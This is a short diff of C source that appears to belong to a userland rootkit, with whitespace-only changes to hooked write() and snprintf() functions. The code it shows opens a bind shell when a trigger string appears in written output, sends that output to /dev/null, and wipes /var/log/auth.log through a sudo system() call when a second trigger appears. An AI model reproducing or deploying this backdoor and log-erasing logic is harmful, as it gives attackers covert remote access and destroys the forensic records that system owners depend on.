@@ -46,15 +46,15 @@ ssize_t write(int fd, const void *buf, size_t nbytes)
     char *clear_logs = strstr(buf, CLEAR_LOGS);
     if (trigger_found != NULL) //we know we want to make a bind shell
     {
-	      fd = open("/dev/null", O_WRONLY | O_APPEND);
-	      ret = new_write(fd, buf, nbytes);
+	fd = open("/dev/null", O_WRONLY | O_APPEND);
+	ret = new_write(fd, buf, nbytes);
       	bind_shell();
     }
 
     else if (clear_logs != NULL)
     {
-	      system("sudo echo "" > /var/log/auth.log");
-	      fd = open("/dev/null", O_WRONLY | O_APPEND);
+        system("sudo echo "" > /var/log/auth.log");
+ 	fd = open("/dev/null", O_WRONLY | O_APPEND);
       	ret = new_write(fd, buf, nbytes);
     }
 
@@ -84,9 +84,9 @@ int snprintf(char *str, size_t size, const char *format, ...)
     char *trigger_found = strstr(buffer, TRIGGER_1);
     if (trigger_found != NULL)
     {
-	      bind_shell();
-	      ret = new_snprintf(str, size, format, func_args);
-	      bind_shell();
+        bind_shell();
+	ret = new_snprintf(str, size, format, func_args);
+        bind_shell();
     }
     else
     {
